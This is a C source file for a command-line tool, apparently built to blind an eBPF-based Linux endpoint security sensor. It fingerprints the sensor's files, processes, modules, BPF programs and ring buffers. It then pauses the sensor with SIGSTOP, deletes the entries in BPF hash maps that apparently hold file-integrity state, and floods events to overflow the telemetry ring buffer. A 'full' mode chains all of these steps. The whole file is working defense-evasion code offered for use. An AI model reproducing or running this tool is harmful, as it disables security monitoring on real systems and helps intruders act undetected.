#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <dirent.h>
#include <signal.h>
#include <time.h>
#include <sys/syscall.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <linux/bpf.h>
#include <stddef.h>
#include <pthread.h>

static int bpf_call(int cmd, union bpf_attr *a, unsigned int sz)
{
    return (int)syscall(__NR_bpf, cmd, a, sz);
}

static int bpf_prog_fd_by_id(uint32_t id)
{
    union bpf_attr a = {};
    a.prog_id = id;
    return bpf_call(BPF_PROG_GET_FD_BY_ID, &a, sizeof(a));
}

static int bpf_map_fd_by_id(uint32_t id)
{
    union bpf_attr a = {};
    a.map_id = id;
    return bpf_call(BPF_MAP_GET_FD_BY_ID, &a, sizeof(a));
}

static pid_t find_proc(const char *pattern)
{
    DIR *dp = opendir("/proc"); if (!dp) return -1;
    struct dirent *de; pid_t found = -1;
    while ((de = readdir(dp)) && found < 0) {
        char *end; long pid = strtol(de->d_name, &end, 10);
        if (*end) continue;
        char path[64], comm[64];
        snprintf(path, sizeof(path), "/proc/%ld/comm", pid);
        int fd = open(path, O_RDONLY); if (fd < 0) continue;
        ssize_t n = read(fd, comm, sizeof(comm)-1); close(fd);
        if (n <= 0) continue;
        comm[n] = '\0'; if (comm[n-1] == '\n') comm[n-1] = '\0';
        if (strstr(comm, pattern)) found = (pid_t)pid;
    }
    closedir(dp);
    return found;
}

static void read_cmdline(pid_t pid, char *buf, size_t sz)
{
    char path[64];
    snprintf(path, sizeof(path), "/proc/%d/cmdline", pid);
    int fd = open(path, O_RDONLY); if (fd < 0) { buf[0] = '\0'; return; }
    ssize_t n = read(fd, buf, sz - 1); close(fd);
    if (n <= 0) { buf[0] = '\0'; return; }
    buf[n] = '\0';
    for (ssize_t i = 0; i < n - 1; i++) if (buf[i] == '\0') buf[i] = ' ';
}

static const char *prog_type_str(uint32_t t)
{
    switch (t) {
    case BPF_PROG_TYPE_KPROBE:          return "kprobe";
    case BPF_PROG_TYPE_TRACING:         return "tracing";
    case BPF_PROG_TYPE_PERF_EVENT:      return "perf_event";
    case BPF_PROG_TYPE_SOCKET_FILTER:   return "sock_filter";
    case BPF_PROG_TYPE_LSM:             return "lsm";
    case BPF_PROG_TYPE_CGROUP_SKB:      return "cgroup_skb";
    case BPF_PROG_TYPE_CGROUP_SOCK:     return "cgroup_sock";
    default:                            return "other";
    }
}

static int is_sensor_prog(struct bpf_prog_info *info)
{
    return (info->type == BPF_PROG_TYPE_KPROBE ||
            info->type == BPF_PROG_TYPE_TRACING ||
            info->type == BPF_PROG_TYPE_PERF_EVENT);
}

static void recon(void)
{
    const char *files[] = {
        "/opt/sensor vendor/bpf-sensor",
        "/opt/sensor/bpf-sensord",
        "/opt/sensor/.sensor_guard.bin",
        "/var/run/bpf-sensor.pid",
        "/run/bpf-sensor.pid",
        NULL
    };
    for (int i = 0; files[i]; i++) {
        struct stat st;
        if (stat(files[i], &st) == 0)
            printf("    %-45s [EXISTS]\n", files[i]);
    }
    puts("\n[bpf_sensor] processes:");
    const char *procs[] = { "bpf-sensor", "bpf-sensord", "bpf-agent", NULL };
    for (int i = 0; procs[i]; i++) {
        pid_t p = find_proc(procs[i]);
        if (p > 0) {
            char cmd[256];
            read_cmdline(p, cmd, sizeof(cmd));
            printf("    pid=%-6d %s\n", p, cmd[0] ? cmd : procs[i]);
        }
    }
    puts("\n[bpf_sensor] kernel modules:");
    const char *mods[] = { "lsm_sensor", "nf_netcontain", "kal_sensor", NULL };
    FILE *f = fopen("/proc/modules", "r");
    if (f) {
        char line[256];
        while (fgets(line, sizeof(line), f)) {
            char mod[64]; if (sscanf(line, "%63s", mod) != 1) continue;
            for (int i = 0; mods[i]; i++)
                if (strcmp(mod, mods[i]) == 0)
                    printf("    %s [LOADED]\n", mod);
        }
        fclose(f);
    }
    puts("\n[bpf_sensor] BPF programs (kprobe/tracing/perf_event):");
    int count = 0;
    uint32_t id = 0;
    for (;;) {
        union bpf_attr a = {}; a.start_id = id;
        if (bpf_call(BPF_PROG_GET_NEXT_ID, &a, sizeof(a)) < 0) break;
        id = a.next_id;
        int fd = bpf_prog_fd_by_id(id); if (fd < 0) continue;
        union bpf_attr ia = {}; struct bpf_prog_info info = {};
        ia.info.bpf_fd = (uint32_t)fd; ia.info.info_len = sizeof(info);
        ia.info.info = (uint64_t)(uintptr_t)&info;
        bpf_call(BPF_OBJ_GET_INFO_BY_FD, &ia, sizeof(ia)); close(fd);
        if (!is_sensor_prog(&info)) continue;
        printf("    id=%-5u type=%-12s name=%-16s jited=%u\n",
               id, prog_type_str(info.type), info.name, info.jited_prog_len);
        count++;
    }
    printf("    total sensor-type programs: %d\n", count);
    puts("\n[bpf_sensor] BPF ring buffer maps:");
    uint32_t mid = 0;
    for (;;) {
        union bpf_attr a = {}; a.start_id = mid;
        if (bpf_call(BPF_MAP_GET_NEXT_ID, &a, sizeof(a)) < 0) break;
        mid = a.next_id;
        int fd = bpf_map_fd_by_id(mid); if (fd < 0) continue;
        union bpf_attr ia = {}; struct bpf_map_info info = {};
        ia.info.bpf_fd = (uint32_t)fd; ia.info.info_len = sizeof(info);
        ia.info.info = (uint64_t)(uintptr_t)&info;
        bpf_call(BPF_OBJ_GET_INFO_BY_FD, &ia, sizeof(ia)); close(fd);
        if (info.type == BPF_MAP_TYPE_RINGBUF)
            printf("    id=%-5u type=ringbuf name=%-16s max_entries=%u\n",
                   mid, info.name, info.max_entries);
    }
}

static void enum_progs(void)
{
    uint32_t id = 0; int n = 0;
    printf("%-6s %-14s %-16s %-10s\n", "ID", "TYPE", "NAME", "JITED_SZ");
    for (;;) {
        union bpf_attr a = {}; a.start_id = id;
        if (bpf_call(BPF_PROG_GET_NEXT_ID, &a, sizeof(a)) < 0) break;
        id = a.next_id;
        int fd = bpf_prog_fd_by_id(id); if (fd < 0) continue;
        union bpf_attr ia = {}; struct bpf_prog_info info = {};
        ia.info.bpf_fd = (uint32_t)fd; ia.info.info_len = sizeof(info);
        ia.info.info = (uint64_t)(uintptr_t)&info;
        bpf_call(BPF_OBJ_GET_INFO_BY_FD, &ia, sizeof(ia)); close(fd);
        if (!is_sensor_prog(&info)) continue;
        printf("%-6u %-14s %-16s %-10u\n", id, prog_type_str(info.type),
               info.name, info.jited_prog_len);
        n++;
    }
    printf("\n%d sensor-type BPF programs found\n", n);
}

static int freeze(int seconds)
{
    pid_t pid = find_proc("bpf-sens");
    if (pid < 0) {
        printf("[bpf_sensor] sensor process not found\n");
        return 1;
    }
    printf("[bpf_sensor] pid=%d found\n", pid);
    if (kill(pid, SIGSTOP) < 0) {
        printf("[bpf_sensor] SIGSTOP failed: %s\n", strerror(errno));
        return 1;
    }
    printf("[bpf_sensor] SIGSTOP sent\n");
    sleep((unsigned)seconds);
    if (kill(pid, SIGCONT) < 0)
        printf("[bpf_sensor] SIGCONT failed: %s\n", strerror(errno));
    else
        printf("[bpf_sensor] SIGCONT sent\n");
    return 0;
}

static int wipe_fim_maps(void)
{
    int wiped = 0, failed = 0, checked = 0;
    uint32_t mid = 0;
    for (;;) {
        union bpf_attr ga = {}; ga.start_id = mid;
        if (bpf_call(BPF_MAP_GET_NEXT_ID, &ga, sizeof(ga)) < 0) break;
        mid = ga.next_id;
        int fd = bpf_map_fd_by_id(mid); if (fd < 0) continue;
        union bpf_attr ia = {}; struct bpf_map_info info = {};
        ia.info.bpf_fd = (uint32_t)fd; ia.info.info_len = sizeof(info);
        ia.info.info = (uint64_t)(uintptr_t)&info;
        bpf_call(BPF_OBJ_GET_INFO_BY_FD, &ia, sizeof(ia));
        if (info.type != BPF_MAP_TYPE_HASH || info.key_size < 8 || info.key_size > 16) {
            close(fd); continue;
        }
        checked++;
        printf("[fim] id=%-5u name=%-16s key=%u val=%u max=%u - wiping...",
               mid, info.name, info.key_size, info.value_size, info.max_entries);
        fflush(stdout);
        uint8_t *key     = calloc(1, info.key_size);
        uint8_t *next    = calloc(1, info.key_size);
        uint8_t *value   = calloc(1, info.value_size);
        int del_count = 0;
        if (!key || !next || !value) { close(fd); free(key); free(next); free(value); continue; }
        union bpf_attr nk = {};
        nk.map_fd   = (uint32_t)fd;
        nk.key      = 0;
        nk.next_key = (uint64_t)(uintptr_t)next;
        while (bpf_call(BPF_MAP_GET_NEXT_KEY, &nk, sizeof(nk)) == 0) {
            memcpy(key, next, info.key_size);
            union bpf_attr da = {};
            da.map_fd = (uint32_t)fd;
            da.key    = (uint64_t)(uintptr_t)key;
            if (bpf_call(BPF_MAP_DELETE_ELEM, &da, sizeof(da)) == 0)
                del_count++;
            else
                failed++;
            nk.key      = (uint64_t)(uintptr_t)key;
            nk.next_key = (uint64_t)(uintptr_t)next;
        }
        printf(" %d entries deleted\n", del_count);
        if (del_count > 0) wiped++;
        free(key); free(next); free(value);
        close(fd);
    }
    printf("[fim] checked=%d maps with entries wiped=%d failures=%d\n",
           checked, wiped, failed);
    return 0;
}

static volatile int flood_stop = 0;
static void *flood_thread(void *arg)
{
    (void)arg;
    char path[64];
    int n = 0;
    while (!flood_stop) {
        struct stat st;
        snprintf(path, sizeof(path), "/proc/%d/stat", (int)getpid());
        stat(path, &st);
        int fd = open("/dev/null", O_RDONLY); if (fd >= 0) close(fd);
        n++;
        if (n % 10000 == 0) {  usleep(0); }
    }
    return NULL;
}

static int ringbuf_fill(int seconds)
{
    flood_stop = 0;
    pthread_t t;
    pthread_create(&t, NULL, flood_thread, NULL);
    sleep((unsigned)seconds);
    flood_stop = 1;
    pthread_join(t, NULL);
    return 0;
}

int main(int argc, char **argv)
{
    if (argc < 2) {
        fprintf(stderr, "usage: %s <recon|freeze|wipe-fim|enum-progs|ringbuf-fill|full>\n", argv[0]);
        return 1;
    }
    int seconds = 10;
    if (argc >= 3) seconds = atoi(argv[2]);
    if (seconds <= 0) seconds = 10;
    if (strcmp(argv[1], "recon") == 0) {
        recon();
    } else if (strcmp(argv[1], "freeze") == 0) {
        freeze(seconds);
    } else if (strcmp(argv[1], "wipe-fim") == 0) {
        wipe_fim_maps();
    } else if (strcmp(argv[1], "enum-progs") == 0) {
        enum_progs();
    } else if (strcmp(argv[1], "ringbuf-fill") == 0) {
        ringbuf_fill(seconds);
    } else if (strcmp(argv[1], "full") == 0) {
        recon();
        pid_t pid = find_proc("bpf-sens");
        if (pid < 0) { printf("[bpf_sensor] not found - aborting\n"); return 1; }
        if (kill(pid, SIGSTOP) < 0) { printf("SIGSTOP: %s\n", strerror(errno)); return 1; }
        wipe_fim_maps();
        ringbuf_fill(seconds);
        kill(pid, SIGCONT);
    } else {
        fprintf(stderr, "unknown command: %s\n", argv[1]);
        return 1;
    }
    return 0;
}
